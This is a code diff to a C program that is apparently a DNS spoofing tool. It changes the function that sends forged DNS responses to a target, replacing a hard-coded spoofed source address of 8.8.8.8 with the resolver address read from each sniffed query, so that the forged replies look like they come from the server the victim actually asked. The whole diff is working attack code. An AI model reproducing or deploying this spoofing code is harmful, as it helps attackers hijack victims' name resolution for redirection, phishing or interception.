@@ -149,6 +149,7 @@ send_spoofed_dns_response(u_char	*dns_req,
 			  char		*target_ip,
 			  int		len,
 			  uint32_t	*dest_ip,
+			  uint32_t	*src_ip,
 			  uint16_t	dest_port) {
 
 	u_char			dns_res[1000]; 
@@ -173,7 +174,8 @@ send_spoofed_dns_response(u_char	*dns_req,
     	iph->ttl = 255;            
     	iph->proto = 17;          
     	iph->crc = 0;            
-    	iph->saddr = inet_addr("8.8.8.8");      
+    	//iph->saddr = inet_addr("8.8.8.8");
+	iph->saddr = *src_ip;
     	iph->daddr = *dest_ip;
 	
 	iph->crc = csum((unsigned short *)dns_res, ip_len/*htons(iph->tlen)*/); 
@@ -337,6 +339,7 @@ process_packet(	u_char 				*attack_filename,
 							   target_ip, 
 							   header->len - (14 + ip_header_len + 8),
 							   (uint32_t *)(packet + 14 + 12),
+							   (uint32_t *)(packet + 14 + 16),
 							   udp->sport);
                         if (status != 0) {
                                 printf("\nUnable to send spoofed DNS response to target !\n");
@@ -348,6 +351,7 @@ process_packet(	u_char 				*attack_filename,
                                                            myip,
                                                            header->len - (14 + ip_header_len + 8),
                                                            (uint32_t *)(packet + 14 + 12),
+							   (uint32_t *)(packet + 14 + 16),
                                                            udp->sport);
 			if (status != 0) {
 				printf("\nUnable to send spoofed DNS response to target !\n");
